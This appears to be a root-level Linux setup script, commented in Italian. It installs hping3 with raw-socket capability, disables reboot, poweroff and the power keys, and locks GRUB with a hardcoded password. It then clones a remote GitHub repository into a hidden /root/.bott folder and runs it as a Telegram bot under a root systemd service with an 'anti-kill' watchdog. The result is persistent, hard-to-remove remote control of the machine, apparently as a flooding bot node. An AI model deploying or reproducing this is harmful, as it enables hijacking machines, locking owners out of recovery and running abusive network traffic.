#!/usr/bin/env python3
import os
import sys
import subprocess

def run(cmd, fatal=False):
    print(f"[+] {cmd}")
    r = subprocess.run(cmd, shell=True)
    if fatal and r.returncode != 0:
        print("[!] ERRORE FATALE")
        sys.exit(1)

# =============================
# REQUIRE ROOT
# =============================
if os.geteuid() != 0:
    print("Devi eseguire questo script come root")
    sys.exit(1)

# =============================
# 1. Install dipendenze
# =============================
run("apt update", fatal=True)
run(
    "apt install -y hping3 git curl build-essential libssl-dev zlib1g-dev "
    "libncurses5-dev libffi-dev libreadline-dev",
    fatal=True
)

# =============================
# 2. setcap hping3
# =============================
if os.path.exists("/usr/sbin/hping3"):
    run("setcap cap_net_raw+ep /usr/sbin/hping3")

# =============================
# 3. PATH root
# =============================
with open("/root/.bashrc", "a") as f:
    f.write("\nexport PATH=$PATH:/sbin:/usr/sbin\n")

# =============================
# 4. POWER / REBOOT LOCK
# =============================
targets = [
    "ctrl-alt-del.target",
    "poweroff.target",
    "reboot.target",
    "suspend.target",
    "hibernate.target"
]
for t in targets:
    run(f"systemctl mask {t}")

logind = "/etc/systemd/logind.conf"
lines = []
if os.path.exists(logind):
    with open(logind) as f:
        lines = f.readlines()

def set_conf(k, v):
    for i,l in enumerate(lines):
        if l.strip().startswith(k):
            lines[i] = f"{k}={v}\n"
            return
    lines.append(f"{k}={v}\n")

set_conf("HandlePowerKey", "ignore")
set_conf("HandleRebootKey", "ignore")
set_conf("HandleSuspendKey", "ignore")
set_conf("KillUserProcesses", "no")

with open(logind, "w") as f:
    f.writelines(lines)

run("systemctl daemon-reexec")
run("systemctl restart systemd-logind")

# =============================
# 5. GRUB LOCK (STABILE, SENZA PEXPECT)
# =============================
GRUB_PASSWORD = "kali55757"
GRUB_CUSTOM = "/etc/grub.d/40_custom"

print("[+] Generazione hash GRUB")

proc = subprocess.run(
    ["grub-mkpasswd-pbkdf2"],
    input=f"{GRUB_PASSWORD}\n{GRUB_PASSWORD}\n",
    text=True,
    capture_output=True
)

output = proc.stdout + proc.stderr

hash_value = None
for line in output.splitlines():
    if "grub.pbkdf2" in line:
        hash_value = line.split()[-1]
        break

if not hash_value:
    print("ERRORE FATALE: hash GRUB non trovato")
    print(output)
    sys.exit(1)

with open(GRUB_CUSTOM, "w") as f:
    f.write(f"""set superusers="root"
password_pbkdf2 root {hash_value}
""")

run("update-grub", fatal=True)

# =============================
# 6. Python 3.10
# =============================
run("cd /usr/src && curl -O https://www.python.org/ftp/python/3.10.14/Python-3.10.14.tgz", fatal=True)
run("cd /usr/src && tar xzf Python-3.10.14.tgz", fatal=True)
run("cd /usr/src/Python-3.10.14 && ./configure --enable-optimizations", fatal=True)
run("cd /usr/src/Python-3.10.14 && make -j$(nproc)", fatal=True)
run("cd /usr/src/Python-3.10.14 && make altinstall", fatal=True)

# =============================
# 7. pip + bot
# =============================
run("/usr/local/bin/python3.10 -m ensurepip", fatal=True)
run("/usr/local/bin/python3.10 -m pip install --upgrade pip", fatal=True)
run("/usr/local/bin/python3.10 -m pip install python-telegram-bot==13.15", fatal=True)

run("cd /root && git clone https://github.com/troiarcazzoguardi-dev/bott.git")

if os.path.exists("/root/bott"):
    run("mv /root/bott /root/.bott")
    run("chmod 711 /root/.bott")

# =============================
# 8. SYSTEMD BOT SERVICE
# =============================
with open("/etc/systemd/system/bott.service", "w") as f:
    f.write("""[Unit]
Description=Telegram Bot
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/.bott
ExecStart=/usr/local/bin/python3.10 /root/.bott/bott.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
""")

run("systemctl daemon-reload")
run("systemctl enable bott")
run("systemctl start bott")

# =============================
# 9. WATCHDOG ANTI-KILL
# =============================
with open("/etc/systemd/system/bott-watchdog.service", "w") as f:
    f.write("""[Unit]
Description=Bot Watchdog
After=bott.service

[Service]
ExecStart=/bin/bash -c 'while true; do systemctl is-active --quiet bott || systemctl restart bott; sleep 10; done'
Restart=always

[Install]
WantedBy=multi-user.target
""")

run("systemctl daemon-reload")
run("systemctl enable bott-watchdog")
run("systemctl start bott-watchdog")

print("\n[✓] SISTEMA LOCKATO – GRUB PROTETTO – BOT ATTIVO – WATCHDOG ATTIVO")
